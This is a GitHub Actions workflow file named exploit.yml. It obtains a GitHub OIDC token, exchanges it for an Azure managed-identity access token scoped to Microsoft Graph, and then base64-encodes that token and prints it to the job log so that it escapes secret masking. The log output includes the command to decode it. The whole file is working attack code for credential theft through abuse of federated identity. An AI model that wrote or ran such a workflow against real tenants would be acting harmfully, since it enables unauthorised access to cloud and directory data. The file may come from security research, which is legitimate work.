# .github/workflows/exploit.yml
name: Azure Access
on: workflow_dispatch

permissions:
  id-token: write
  contents: read

env:
  AZURE_TENANT_ID: "67f8647a-6555-4c70-bee4-45625d332c3f"
  UAMI_CLIENT_ID: "3fa85f64-5717-4562-b3fc-2c963f66afa6"

jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - name: Get GitHub OIDC Token
        id: oidc
        shell: pwsh
        run: |
          $oidcUrl = "$env:ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"
          $headers = @{
              "Accept" = "application/json"
              "Authorization" = "Bearer $env:ACTIONS_ID_TOKEN_REQUEST_TOKEN"
          }
          
          $response = Invoke-RestMethod -Uri $oidcUrl -Headers $headers
          $oidcToken = $response.value
          
          Write-Output "::add-mask::$oidcToken"
          "oidc_token=$oidcToken" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
      
      - name: Exchange for UAMI Token (Graph API scope)
        shell: pwsh
        run: |
          $tokenUrl = "https://login.microsoftonline.com/$env:AZURE_TENANT_ID/oauth2/v2.0/token"
          
          $body = @{
              client_id                = $env:UAMI_CLIENT_ID
              grant_type               = "client_credentials"
              client_assertion_type    = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
              client_assertion         = "${{ steps.oidc.outputs.oidc_token }}"
              scope                    = "https://graph.microsoft.com/.default"
          }
          
          $response = Invoke-RestMethod -Uri $tokenUrl -Method POST -Body $body -ContentType "application/x-www-form-urlencoded"
          $graphToken = $response.access_token
          
          Write-Host "=============================================="
          Write-Host "=== GRAPH TOKEN (Base64 Encoded) ==="
          Write-Host "=============================================="
          $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($graphToken))
          Write-Host $encoded
          Write-Host "=============================================="
          Write-Host ""
          Write-Host "Decode with PowerShell:"
          Write-Host "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('BASE64_STRING'))"